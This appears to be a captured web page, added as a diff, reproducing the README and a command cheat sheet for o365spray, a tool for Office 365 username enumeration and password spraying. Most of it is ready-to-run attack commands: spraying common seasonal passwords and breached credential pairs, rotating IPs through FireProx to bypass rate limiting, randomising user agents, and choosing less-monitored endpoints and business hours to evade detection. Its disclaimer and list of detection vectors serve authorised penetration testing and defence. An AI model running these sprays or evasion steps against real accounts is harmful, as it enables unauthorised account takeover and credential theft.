@@ -1,0 +1,646 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>o365spray - Breachcraft Dev</title>
+<meta name="description" content="o365spray is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365)">
+<link rel="canonical" href="https://breachcraft.dev/tools/o365spray/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">o365spray</p>
+  <h1>o365spray</h1>
+  <p class="lede">o365spray is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365)</p>
+  <h2>What it is</h2>
+<p>o365spray is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in Acknowledgments.</p>
+<blockquote><p>For educational, authorized and/or research purposes only.</p></blockquote>
+<blockquote><p>WARNING: The Autologon, oAuth2, and RST user enumeration modules work by submitting a single authentication attempt per user. If the modules are run in conjunction with password spraying in a single execution, o365spray will automatically reset the lockout timer prior to performing the password spray -- if enumeration is run alone, the user should be aware of how many and when each authentication attempt was made and manually reset the lockout timer before performing any password spraying.</p></blockquote>
+<h2>Table of Contents</h2>
+<ul>
+<li>Usage</li>
+<li>Modules</li>
+<li>Validation</li>
+<li>Enumeration</li>
+<li>Spraying</li>
+<li>FireProx URLs</li>
+<li>Enumeration</li>
+<li>Spraying</li>
+<li>User Agent Randomization</li>
+<li>Acknowledgments</li>
+<li>Bugs</li>
+<li>Previous Versions</li>
+</ul>
+<h3>Usage</h3>
+<p>Validate a domain is using O365:&lt;br&gt; <code>o365spray --validate --domain test.com</code></p>
+<p>Perform username enumeration against a given domain:&lt;br&gt; <code>o365spray --enum -U usernames.txt --domain test.com</code></p>
+<p>Perform password spraying against a given domain:&lt;br&gt; <code>o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com</code></p>
+<pre><code>usage: o365spray [flags]
+
+o365spray | Microsoft O365 User Enumerator and Password Sprayer -- v3.0.4
+
+options:
+  -h, --help            show this help message and exit
+
+Target:
+  -d DOMAIN, --domain DOMAIN
+                        Target domain for validation, user enumeration, and/or
+                        password spraying.
+
+Actions:
+  --validate            Run domain validation only.
+
+  --enum                Run username enumeration.
+
+  --spray               Run password spraying.
+
+Credentials:
+  -u USERNAME, --username USERNAME
+                        Username(s) delimited using commas.
+
+  -p PASSWORD, --password PASSWORD
+                        Password(s) delimited using commas.
+
+  -U USERFILE, --userfile USERFILE
+                        File containing list of usernames.
+
+  -P PASSFILE, --passfile PASSFILE
+                        File containing list of passwords.
+
+  --paired PAIRED       File containing list of credentials in username:password
+                        format.
+
+Password Spraying Configuration:
+  -c COUNT, --count COUNT
+                        Number of password attempts to run per user before resetting
+                        the lockout account timer.
+                        Default: 1
+
+  -l LOCKOUT, --lockout LOCKOUT
+                        Lockout policy's reset time (in minutes).
+                        Default: 15 minutes
+
+Module Configuration:
+  --validate-module VALIDATE_MODULE
+                        Specify which valiadtion module to run.
+                        Default: getuserrealm
+
+  --enum-module ENUM_MODULE
+                        Specify which enumeration module to run.
+                        Default: office
+
+  --spray-module SPRAY_MODULE
+                        Specify which password spraying module to run.
+                        Default: oauth2
+
+  --adfs-url ADFS_URL   AuthURL of the target domain's ADFS login page for password
+                        spraying.
+
+Scan Configuration:
+  --sleep [-1, 0-120]   Throttle HTTP requests every `N` seconds. This can be randomized
+                        by passing the value `-1` (between 1 sec and 2 mins).
+                        Default: 0
+
+  --jitter [0-100]      Jitter extends --sleep period by percentage given (0-100).
+                        Default: 0
+
+  --rate RATE           Number of concurrent connections (attempts) during
+                        enumeration and spraying.
+                        Default: 10
+
+  --poolsize POOLSIZE   Maximum size of the ThreadPoolExecutor.
+                        Default: 10000
+
+  --safe SAFE           Terminate password spraying run if `N` locked accounts
+                        are observed.
+                        Default: 10
+
+HTTP Configuration:
+  --useragents USERAGENTS
+                        File containing list of user agents for randomization.
+
+  --timeout TIMEOUT     HTTP request timeout in seconds. Default: 25
+
+  --proxy PROXY         HTTP/S proxy to pass traffic through
+                        (e.g. http://127.0.0.1:8080).
+
+  --proxy-url PROXY_URL
+                        FireProx API URL.
+
+Output Configuration:
+  --output OUTPUT       Output directory for results and test case files.
+                        Default: current directory
+
+Debug:
+  -v, --version         Print the tool version.
+
+  --debug               Enable debug output.</code></pre>
+<h3>Modules</h3>
+<h4>Validation</h4>
+<ul>
+<li>getuserrealm (default)</li>
+</ul>
+<h4>Enumeration</h4>
+<ul>
+<li>autologon</li>
+<li>oauth2 (default)</li>
+<li>office</li>
+<li>onedrive</li>
+<li>rst</li>
+</ul>
+<blockquote><p>The onedrive module relies on the target user(s) having previously logged into OneDrive. If a valid user has not yet used OneDrive, their account will show as 'invalid'.</p></blockquote>
+<h4>Spraying</h4>
+<ul>
+<li>activesync</li>
+<li>adfs</li>
+<li>autodiscover</li>
+<li>autologon</li>
+<li>oauth2 (default)</li>
+<li>reporting</li>
+<li>rst</li>
+</ul>
+<blockquote><p>The oAuth2 module can be used for federated spraying, but it should be noted that this will ONLY work when the target tenant has enabled password synchronization - otherwise authentication will always fail. The default mechanic is to default to the 'adfs' module when federation is identified.</p></blockquote>
+<h3>FireProx Base URLs</h3>
+<p>Microsoft has made it more difficult to perform password spraying, so using tools like <a href="https://github.com/ustayready/fireprox">FireProx</a> help to bypass rate-limiting based on IP addresses.</p>
+<p>To use FireProx with o365spray, create a proxy URL for the given o365spray module based on the base URL tables below. The proxy URL can then be passed in via <code>--proxy-url</code>.</p>
+<blockquote><p>NOTE: Make sure to use the correct <code>--enum-module</code> or <code>--spray-module</code> flag with the base URL used to create the FireProx URL.</p></blockquote>
+<h4>Enumeration</h4>
+<blockquote><p>The 'tenant' value in the OneDrive URL is the domain name value that is provided via the <code>--domain</code> flag.</p></blockquote>
+<table>
+<thead>
+<tr>
+<th>Module</th>
+<th>Base URL</th>
+</tr>
+</thead>
+<tbody>
+<tr><td>autodiscover</td><td><code>https://outlook.office365.com/</code></td></tr>
+<tr><td>autologon</td><td><code>https://autologon.microsoftazuread-sso.com/</code></td></tr>
+<tr><td>oauth2</td><td><code>https://login.microsoftonline.com/</code></td></tr>
+<tr><td>office</td><td><code>https://login.microsoftonline.com/</code></td></tr>
+<tr><td>rst</td><td><code>https://login.microsoftonline.com/</code></td></tr>
+<tr><td>onedrive</td><td><code>https://&lt;tenant&gt;-my.sharepoint.com/</code></td></tr>
+</tbody>
+</table>
+<h4>Spraying</h4>
+<table>
+<thead>
+<tr>
+<th>Module</th>
+<th>Base URL</th>
+</tr>
+</thead>
+<tbody>
+<tr><td>activesync</td><td><code>https://outlook.office365.com/</code></td></tr>
+<tr><td>adfs</td><td>Currently not implemented</td></tr>
+<tr><td>autodiscover</td><td><code>https://autodiscover-s.outlook.com/</code></td></tr>
+<tr><td>autologon</td><td><code>https://autologon.microsoftazuread-sso.com/</code></td></tr>
+<tr><td>oauth2</td><td><code>https://login.microsoftonline.com/</code></td></tr>
+<tr><td>reporting</td><td><code>https://reports.office365.com/</code></td></tr>
+<tr><td>rst</td><td><code>https://login.microsoftonline.com/</code></td></tr>
+</tbody>
+</table>
+<h3>User Agent Randomization</h3>
+<p>User-Agent randomization is now supported and can be accomplished by providing a User-Agent file to the <code>--useragents</code> flag. o365spray includes an example file with 4,800+ agents via resc/user-agents.txt.</p>
+<p>The agents in the example data set were collected from the following:</p>
+<ul>
+<li><a href="https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/user-agents.txt">https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/user-agents.txt</a></li>
+<li><a href="https://www.useragentstring.com/pages/useragentstring.php?name=browser">https://www.useragentstring.com/pages/useragentstring.php?name=&amp;lt;browser&amp;gt;</a></li>
+</ul>
+<h3>Omnispray</h3>
+<p>The o365spray framework has been ported to a new tool: <a href="https://github.com/0xZDH/Omnispray">Omnispray</a>. This tool is meant to modularize the original enumeration and spraying framework to allow for generic targeting, not just O365. Omnispray includes template modules for enumeration and spraying that can be modified and leveraged for any target.</p>
+<h3>Acknowledgments</h3>
+<table>
+<thead>
+<tr>
+<th>Author</th>
+<th>Tool/Research</th>
+<th>Link</th>
+</tr>
+</thead>
+<tbody>
+<tr><td><a href="https://github.com/gremwell">gremwell</a></td><td>o365enum: User enumeration via office.com without authentication</td><td><a href="https://github.com/gremwell/o365enum">o365enum</a></td></tr>
+<tr><td><a href="https://bitbucket.org/grimhacker">grimhacker</a></td><td>office365userenum: ActiveSync user enumeration research and discovery.</td><td><a href="https://bitbucket.org/grimhacker/office365userenum/src/master/">office365userenum</a> / <a href="https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/">blog post</a></td></tr>
+<tr><td><a href="https://github.com/Raikia">Raikia</a></td><td>UhOh365: User enumeration via Autodiscover without authentication.</td><td><a href="https://github.com/Raikia/UhOh365">UhOh365</a></td></tr>
+<tr><td><a href="https://github.com/dafthack">dafthack</a></td><td>MSOLSpray: Password spraying via MSOL</td><td><a href="https://github.com/dafthack/MSOLSpray">MSOLSpray</a></td></tr>
+<tr><td><a href="https://github.com/byt3bl33d3r">byt3bl33d3r</a></td><td>MSOLSpray: Python reimplementation</td><td><a href="https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f">Gist</a></td></tr>
+<tr><td><a href="https://github.com/nyxgeek">nyxgeek</a></td><td>onedrive_user_enum: OneDrive user enumeration</td><td><a href="https://github.com/nyxgeek/onedrive_user_enum">onedrive_user_enum</a> / <a href="https://www.trustedsec.com/blog/achieving-passive-user-enumeration-with-onedrive/">blog post</a></td></tr>
+<tr><td><a href="https://github.com/Mr-Un1k0d3r">Mr-Un1k0d3r</a></td><td>adfs-spray: ADFS password spraying</td><td><a href="https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py">adfs-spray</a></td></tr>
+<tr><td><a href="https://github.com/NestoriSyynimaa">Nestori Syynimaa</a></td><td>AADInternals: oAuth2 and autologon modules</td><td><a href="https://github.com/Gerenios/AADInternals">AADInternals</a></td></tr>
+<tr><td><a href="https://danielchronlund.com/">Daniel Chronlund</a> / <a href="https://github.com/xFreed0m">xFreed0m</a></td><td>Invoke-AzureAdPasswordSprayAttack / ADFSpray: Office 365 reporting API password spraying</td><td><a href="https://danielchronlund.com/2020/03/17/azure-ad-password-spray-attacks-with-powershell-and-how-to-defend-your-tenant/">Invoke-AzureAdPasswordSprayAttack</a> / <a href="https://github.com/xFreed0m/ADFSpray">ADFSpray</a></td></tr>
+<tr><td><a href="https://github.com/optiv">Optiv</a> (Several Authors)</td><td>Go365: RST user enumeration and password spraying module</td><td><a href="https://github.com/optiv/Go365">Go365</a></td></tr>
+<tr><td><a href="https://github.com/byt3bl33d3r">byt3bl33d3r</a></td><td>SprayingToolkit: Code references</td><td><a href="https://github.com/byt3bl33d3r/SprayingToolkit/">SprayingToolkit</a></td></tr>
+<tr><td><a href="https://github.com/sensepost">sensepost</a></td><td>ruler: Code references</td><td><a href="https://github.com/sensepost/ruler/">Ruler</a></td></tr>
+</tbody>
+</table>
+<h3>Bugs</h3>
+<p>If any bugs/errors are encountered, please open an Issue with the details (or a Pull Request with the proposed fix). See the section below for more information about using previous versions.</p>
+<h3>Using Previous Versions</h3>
+<p>If issues are encountered, try checking out previous versions prior to code rewrites:</p>
+<pre><code># v1.3.7
+git checkout e235abdcebad61dbd2cde80974aca21ddb188704
+
+# v2.0.4
+git checkout a585432f269a8f527d61f064822bb08880c887ef</code></pre>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> Python Tool</li><li><strong>Purpose</strong> Office 365 username enumeration and password spraying</li><li><strong>Platform</strong> Windows, Linux, macOS</li><li><strong>Tags</strong> #o365 #enumeration #password-spray #initial-access #python #user-enum #auth</li></ul>
+<h3>Installation &amp; Setup</h3>
+<pre><code># Install via pip
+pip install o365spray
+
+# Or clone from GitHub
+git clone https://github.com/0xZDH/o365spray.git
+cd o365spray
+pip install -r requirements.txt
+python3 setup.py install
+
+# Verify installation
+o365spray --version</code></pre>
+<h3>Quick Reference (Most Common Commands)</h3>
+<pre><code># Validate O365 domain
+o365spray --validate --domain company.com
+
+# Enumerate users
+o365spray --enum -U users.txt --domain company.com
+
+# Password spray
+o365spray --spray -U valid-users.txt -p 'Password123!' --count 1 --lockout 15 --domain company.com
+
+# Password spray with multiple passwords
+o365spray --spray -U users.txt -P passwords.txt --count 2 --lockout 5 --domain company.com
+
+# Spray with user:password pairs
+o365spray --spray --paired creds.txt --domain company.com</code></pre>
+<h3>RECON: Domain Validation</h3>
+<h4>RECON: Validate O365 Tenant</h4>
+<p><strong>Use Case:</strong> Check if domain uses Office 365</p>
+<pre><code># Default getuserrealm module
+o365spray --validate --domain company.com
+
+# Shows:
+# - If domain uses O365
+# - Federation status (federated vs managed)
+# - Tenant brand name
+# - Authentication URL
+
+# Custom module
+o365spray --validate --domain company.com --validate-module getuserrealm</code></pre>
+<h3>ENUM: Username Enumeration</h3>
+<h4>ENUM: Office Module (Default)</h4>
+<p><strong>Use Case:</strong> Enumerate valid Office 365 users</p>
+<pre><code># Basic enumeration
+o365spray --enum -U usernames.txt --domain company.com
+
+# Office module (default)
+o365spray --enum -U users.txt --domain company.com --enum-module office
+
+# Single username
+o365spray --enum -u "john.doe" --domain company.com
+o365spray --enum -u "john.doe@company.com" --domain company.com
+
+# Multiple usernames (comma separated)
+o365spray --enum -u "user1,user2,user3" --domain company.com</code></pre>
+<h4>ENUM: OAuth2 Module</h4>
+<p><strong>Use Case:</strong> Enumerate via OAuth2 endpoint</p>
+<pre><code># OAuth2 module
+o365spray --enum -U users.txt --domain company.com --enum-module oauth2
+
+# WARNING: Submits authentication attempt per user
+# May trigger lockout if used with password spraying</code></pre>
+<h4>ENUM: OneDrive Module</h4>
+<p><strong>Use Case:</strong> Enumerate users via OneDrive</p>
+<pre><code># OneDrive enumeration
+o365spray --enum -U users.txt --domain company.com --enum-module onedrive
+
+# NOTE: Only detects users who have logged into OneDrive before
+# Users who haven't used OneDrive will show as invalid</code></pre>
+<h4>ENUM: Autologon Module</h4>
+<p><strong>Use Case:</strong> Enumerate via autologon endpoint</p>
+<pre><code># Autologon module
+o365spray --enum -U users.txt --domain company.com --enum-module autologon
+
+# WARNING: Submits authentication attempt
+# Consider lockout policy</code></pre>
+<h4>ENUM: RST Module</h4>
+<p><strong>Use Case:</strong> Enumerate via RST (Request Security Token)</p>
+<pre><code># RST enumeration
+o365spray --enum -U users.txt --domain company.com --enum-module rst
+
+# WARNING: Submits authentication attempt
+# May impact lockout timer</code></pre>
+<h3>CRED: Password Spraying</h3>
+<h4>CRED: Basic Password Spray</h4>
+<p><strong>Use Case:</strong> Spray single password against user list</p>
+<pre><code># Single password
+o365spray --spray -U valid-users.txt -p 'Summer2024!' --count 1 --lockout 15 --domain company.com
+
+# Default oauth2 module
+o365spray --spray -U users.txt -p 'Password123!' --domain company.com
+
+# Output results to directory
+o365spray --spray -U users.txt -p 'Password1' --output ./results --domain company.com</code></pre>
+<h4>CRED: Multiple Passwords</h4>
+<p><strong>Use Case:</strong> Spray multiple passwords with lockout awareness</p>
+<pre><code># Password file
+o365spray --spray -U users.txt -P passwords.txt --count 2 --lockout 5 --domain company.com
+
+# Comma-separated passwords
+o365spray --spray -U users.txt -p 'Pass1,Pass2,Pass3' --count 3 --lockout 10 --domain company.com
+
+# --count: number of passwords to try before waiting for lockout reset
+# --lockout: minutes to wait between spray cycles</code></pre>
+<h4>CRED: Paired Credentials</h4>
+<p><strong>Use Case:</strong> Test username:password pairs (e.g., from breach data)</p>
+<pre><code># Format: username:password (one per line)
+o365spray --spray --paired credentials.txt --domain company.com
+
+# Example credentials.txt:
+# john@company.com:Password123
+# jane@company.com:Summer2024!
+# admin@company.com:CompanyName1</code></pre>
+<h4>CRED: ActiveSync Module</h4>
+<p><strong>Use Case:</strong> Spray via ActiveSync (Exchange)</p>
+<pre><code># ActiveSync spray
+o365spray --spray -U users.txt -p 'Password1' --spray-module activesync --domain company.com
+
+# More stealthy, different logs than oauth2</code></pre>
+<h4>CRED: Autodiscover Module</h4>
+<p><strong>Use Case:</strong> Spray via Autodiscover endpoint</p>
+<pre><code># Autodiscover spray
+o365spray --spray -U users.txt -p 'Password1' --spray-module autodiscover --domain company.com</code></pre>
+<h4>CRED: Reporting Module</h4>
+<p><strong>Use Case:</strong> Spray via Office 365 Reporting API</p>
+<pre><code># Reporting API spray
+o365spray --spray -U users.txt -p 'Password1' --spray-module reporting --domain company.com
+
+# Different endpoint, may evade some detections</code></pre>
+<h4>CRED: ADFS Spray</h4>
+<p><strong>Use Case:</strong> Spray federated ADFS endpoint</p>
+<pre><code># ADFS password spraying
+o365spray --spray -U users.txt -p 'Password1' --spray-module adfs --adfs-url https://adfs.company.com/adfs/ls/ --domain company.com
+
+# For federated tenants
+# Get ADFS URL from validation output</code></pre>
+<h4>CRED: Autologon Spray</h4>
+<p><strong>Use Case:</strong> Spray via autologon endpoint</p>
+<pre><code># Autologon spray
+o365spray --spray -U users.txt -p 'Password1' --spray-module autologon --domain company.com</code></pre>
+<h4>CRED: RST Spray</h4>
+<p><strong>Use Case:</strong> Spray via Request Security Token</p>
+<pre><code># RST spray
+o365spray --spray -U users.txt -p 'Password1' --spray-module rst --domain company.com</code></pre>
+<h3>Rate Limiting &amp; Evasion</h3>
+<h4>Rate Limiting Configuration</h4>
+<p><strong>Use Case:</strong> Control request rate to avoid detection</p>
+<pre><code># Delay between requests (seconds)
+o365spray --spray -U users.txt -p 'Password1' --sleep 5 --domain company.com
+
+# Random delay (1 sec - 2 min)
+o365spray --spray -U users.txt -p 'Password1' --sleep -1 --domain company.com
+
+# Add jitter (percentage of sleep time)
+o365spray --spray -U users.txt -p 'Password1' --sleep 5 --jitter 50 --domain company.com
+
+# Concurrent connections
+o365spray --spray -U users.txt -p 'Password1' --rate 5 --domain company.com
+# Default: 10 concurrent</code></pre>
+<h4>User Agent Randomization</h4>
+<p><strong>Use Case:</strong> Randomize user agents to blend in</p>
+<pre><code># User agent file (4,800+ agents included)
+o365spray --spray -U users.txt -p 'Password1' --useragents resc/user-agents.txt --domain company.com
+
+# Custom user agent file
+o365spray --spray -U users.txt -p 'Password1' --useragents my-agents.txt --domain company.com</code></pre>
+<h4>Proxy Configuration</h4>
+<p><strong>Use Case:</strong> Route traffic through proxy</p>
+<pre><code># HTTP/HTTPS proxy
+o365spray --spray -U users.txt -p 'Password1' --proxy http://127.0.0.1:8080 --domain company.com
+
+# SOCKS proxy
+o365spray --spray -U users.txt -p 'Password1' --proxy socks5://127.0.0.1:1080 --domain company.com</code></pre>
+<h3>FireProx Integration</h3>
+<h4>FireProx Setup</h4>
+<p><strong>Use Case:</strong> Bypass IP-based rate limiting with AWS API Gateway</p>
+<pre><code># Create FireProx URL for oauth2 enumeration
+fireprox --command create --url https://login.microsoftonline.com/
+
+# Use FireProx URL with o365spray
+o365spray --enum -U users.txt --domain company.com --enum-module oauth2 --proxy-url https://abc123.execute-api.us-east-1.amazonaws.com/fireprox/
+
+# Create FireProx for ActiveSync spray
+fireprox --command create --url https://outlook.office365.com/
+
+# Spray via FireProx
+o365spray --spray -U users.txt -p 'Password1' --spray-module activesync --proxy-url https://xyz789.execute-api.us-east-1.amazonaws.com/fireprox/ --domain company.com</code></pre>
+<h4>FireProx Base URLs by Module</h4>
+<p><strong>Enumeration Modules:</strong></p>
+<pre><code>autodiscover: https://outlook.office365.com/
+autologon:    https://autologon.microsoftazuread-sso.com/
+oauth2:       https://login.microsoftonline.com/
+office:       https://login.microsoftonline.com/
+rst:          https://login.microsoftonline.com/
+onedrive:     https://&lt;tenant&gt;-my.sharepoint.com/</code></pre>
+<p><strong>Spray Modules:</strong></p>
+<pre><code>activesync:   https://outlook.office365.com/
+autodiscover: https://autodiscover-s.outlook.com/
+autologon:    https://autologon.microsoftazuread-sso.com/
+oauth2:       https://login.microsoftonline.com/
+reporting:    https://reports.office365.com/
+rst:          https://login.microsoftonline.com/</code></pre>
+<h3>Safety &amp; Lockout Protection</h3>
+<h4>Lockout Safety Features</h4>
+<p><strong>Use Case:</strong> Prevent mass account lockouts</p>
+<pre><code># Safe mode: terminate if N locked accounts detected
+o365spray --spray -U users.txt -p 'Password1' --safe 5 --domain company.com
+# Default: 10 locked accounts
+
+# Lockout policy configuration
+o365spray --spray -U users.txt -P passwords.txt --count 2 --lockout 30 --domain company.com
+# --count 2: Try 2 passwords before reset
+# --lockout 30: Wait 30 minutes between cycles
+
+# Example: 3 passwords, 15 min lockout
+o365spray --spray -U users.txt -p 'Pass1,Pass2,Pass3' --count 3 --lockout 15 --domain company.com</code></pre>
+<h3>Output &amp; Logging</h3>
+<h4>Output Configuration</h4>
+<p><strong>Use Case:</strong> Save results and valid credentials</p>
+<pre><code># Specify output directory
+o365spray --spray -U users.txt -p 'Password1' --output ./results/ --domain company.com
+
+# Creates files:
+# - enum/valid_users.txt (valid users)
+# - spray/valid_credentials.txt (valid creds)
+# - spray/tested_logins.txt (all attempts)
+
+# Default: current directory</code></pre>
+<h4>Debug Mode</h4>
+<p><strong>Use Case:</strong> Troubleshoot issues</p>
+<pre><code># Enable debug output
+o365spray --spray -U users.txt -p 'Password1' --debug --domain company.com
+
+# Shows detailed HTTP requests/responses</code></pre>
+<h3>Attack Patterns</h3>
+<h4>Pattern: Validate → Enumerate → Spray</h4>
+<pre><code># 1. Validate target domain
+o365spray --validate --domain company.com
+
+# 2. Enumerate valid users
+o365spray --enum -U potential-users.txt --domain company.com --output ./results/
+
+# 3. Use valid users for spraying
+o365spray --spray -U ./results/enum/valid_users.txt -p 'SeasonYear!' --count 1 --lockout 15 --domain company.com --output ./results/</code></pre>
+<h4>Pattern: Multi-Password Spray with Lockout Awareness</h4>
+<pre><code># Common password list
+cat &gt; passwords.txt &lt;&lt; EOF
+Password123!
+Summer2024!
+Fall2024!
+Winter2024!
+Company2024!
+EOF
+
+# Spray: 2 passwords every 30 minutes
+# (Conservative approach)
+o365spray --spray -U valid-users.txt -P passwords.txt --count 2 --lockout 30 --sleep 5 --domain company.com</code></pre>
+<h4>Pattern: Stealth Spray with FireProx &amp; Random User Agents</h4>
+<pre><code># 1. Setup FireProx
+fireprox --command create --url https://login.microsoftonline.com/
+# Note the API Gateway URL
+
+# 2. Spray with evasion techniques
+o365spray --spray \
+  -U valid-users.txt \
+  -p 'Password123!' \
+  --spray-module oauth2 \
+  --proxy-url https://xyz.execute-api.us-east-1.amazonaws.com/fireprox/ \
+  --useragents resc/user-agents.txt \
+  --sleep -1 \
+  --jitter 50 \
+  --rate 3 \
+  --domain company.com</code></pre>
+<h4>Pattern: Breach Data Validation</h4>
+<pre><code># Test username:password pairs from breach
+o365spray --spray --paired breach-creds.txt --domain company.com
+
+# If successful, user may be reusing leaked passwords</code></pre>
+<h3>Module Selection Guide</h3>
+<h4>When to Use Each Enumeration Module</h4>
+<p><strong>office (Default)</strong> - Recommended</p>
+<ul>
+<li>No authentication attempt</li>
+<li>Fast and reliable</li>
+<li>Minimal risk</li>
+</ul>
+<p><strong>oauth2</strong> - Use with caution</p>
+<ul>
+<li>Submits auth attempt per user</li>
+<li>Can trigger lockout</li>
+<li>Reset lockout timer before spraying</li>
+</ul>
+<p><strong>onedrive</strong> - Specific use case</p>
+<ul>
+<li>Only works for users who've used OneDrive</li>
+<li>May miss valid users</li>
+</ul>
+<p><strong>autologon / rst</strong> - High risk</p>
+<ul>
+<li>Submits auth attempts</li>
+<li>Risk of lockout</li>
+<li>Use sparingly</li>
+</ul>
+<h4>When to Use Each Spray Module</h4>
+<p><strong>oauth2 (Default)</strong> - General purpose</p>
+<ul>
+<li>Works for managed (cloud-only) tenants</li>
+<li>NOT for federated tenants (unless password sync enabled)</li>
+<li>Most common</li>
+</ul>
+<p><strong>activesync</strong> - Alternative</p>
+<ul>
+<li>Different endpoint</li>
+<li>Different logs</li>
+<li>Good for evasion</li>
+</ul>
+<p><strong>reporting</strong> - Evasion</p>
+<ul>
+<li>Office 365 Reporting API</li>
+<li>Less monitored endpoint</li>
+<li>Alternative logging</li>
+</ul>
+<p><strong>autodiscover</strong> - Exchange focus</p>
+<ul>
+<li>Exchange/Outlook specific</li>
+<li>Another alternative endpoint</li>
+</ul>
+<p><strong>adfs</strong> - Federated tenants</p>
+<ul>
+<li>Required for federated domains</li>
+<li>Targets on-prem ADFS</li>
+<li>Need ADFS URL</li>
+</ul>
+<p><strong>autologon / rst</strong> - Advanced</p>
+<ul>
+<li>Alternative authentication flows</li>
+<li>Use for specific scenarios</li>
+</ul>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Lockout Policy</strong>: Most O365 tenants: 10 attempts in 15 minutes 💡 <strong>Enumeration First</strong>: Always enumerate before spraying (don't waste attempts on invalid users) 💡 <strong>Module Selection</strong>: Use 'office' module for enum (no auth attempt) 💡 <strong>FireProx</strong>: Essential for large-scale sprays (bypasses IP rate limiting) 💡 <strong>User Agents</strong>: Randomize to blend in with legit traffic 💡 <strong>Safe Mode</strong>: Use <code>--safe</code> to auto-terminate on lockouts 💡 <strong>Timing</strong>: Spray during business hours (less suspicious) 💡 <strong>Password Patterns</strong>: SeasonYear! format common (Summer2024!, Fall2024!) 💡 <strong>Output Dirs</strong>: Save results for future reference 💡 <strong>Federated</strong>: Check federation status - affects module choice</p>
+<h3>OPSEC Considerations</h3>
+<p>⚠️ <strong>High Risk:</strong></p>
+<ul>
+<li>oauth2/autologon/rst enumeration (auth attempts)</li>
+<li>Rapid spraying without delays</li>
+<li>Spraying from single IP</li>
+<li>Using suspicious/repeated user agents</li>
+<li>Exceeding lockout threshold</li>
+</ul>
+<p>⚠️ <strong>Medium Risk:</strong></p>
+<ul>
+<li>Large-scale enumeration</li>
+<li>Spraying outside business hours</li>
+<li>Multiple spray cycles in short time</li>
+<li>Common password patterns</li>
+</ul>
+<p>✅ <strong>Lower Risk:</strong></p>
+<ul>
+<li>'office' module enumeration (no auth)</li>
+<li>Long delays between attempts (--sleep)</li>
+<li>FireProx for IP rotation</li>
+<li>Random user agents</li>
+<li>Low concurrent rate (--rate 3-5)</li>
+<li>Conservative --count and --lockout values</li>
+<li>Spraying during business hours</li>
+<li>Using breach data (targeted approach)</li>
+</ul>
+<p><strong>Detection Vectors:</strong></p>
+<ul>
+<li>Failed login attempts from single IP</li>
+<li>Unusual authentication patterns</li>
+<li>Failed logins for many users simultaneously</li>
+<li>Authentication from unexpected geos</li>
+<li>Repeated user agent strings</li>
+<li>Azure AD sign-in logs</li>
+<li>Smart lockout triggers</li>
+</ul>
+<h3>Resources</h3>
+<ul>
+<li>GitHub: <a href="https://github.com/0xZDH/o365spray">https://github.com/0xZDH/o365spray</a></li>
+<li>User Agents: resc/user-agents.txt (4,800+ agents)</li>
+<li>FireProx: <a href="https://github.com/ustayready/fireprox">https://github.com/ustayready/fireprox</a></li>
+<li>Omnispray (successor): <a href="https://github.com/0xZDH/Omnispray">https://github.com/0xZDH/Omnispray</a></li>
+<li>Author: @0xZDH</li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
